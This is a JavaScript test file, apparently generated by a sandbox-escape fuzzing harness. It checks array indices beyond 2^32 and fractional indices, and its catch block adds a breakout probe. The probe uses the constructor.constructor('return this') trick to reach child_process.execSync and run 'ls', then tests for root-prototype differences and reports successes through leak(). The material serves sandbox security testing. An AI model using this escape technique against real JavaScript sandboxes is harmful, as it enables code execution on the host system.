try {
    var x = [];
    x[4294967296] = 1;
    assert.sameValue(x[0], undefined, 'x[0]');
    assert.sameValue(x['4294967296'], 1, 'x[\'4294967296\'] !== 1');
    var y = [];
    y[4294967297] = 1;
    if (y[1] !== undefined) {
        $ERROR('#3: y = []; y[4294967297] = 1; y[1] === undefined. Actual: ' + y[1]);
    }
    if (y['4294967297'] !== 1) {
        $ERROR('#4: y = []; y[4294967297] = 1; y["4294967297"] === 1. Actual: ' + y['4294967297']);
    }
    var z = [];
    z[1.1] = 1;
    if (z[1] !== undefined) {
        $ERROR('#5: z = []; z[1.1] = 1; z[1] === undefined. Actual: ' + z[1]);
    }
    if (z['1.1'] !== 1) {
        $ERROR('#6: z = []; z[1.1] = 1; z["1.1"] === 1. Actual: ' + z['1.1']);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}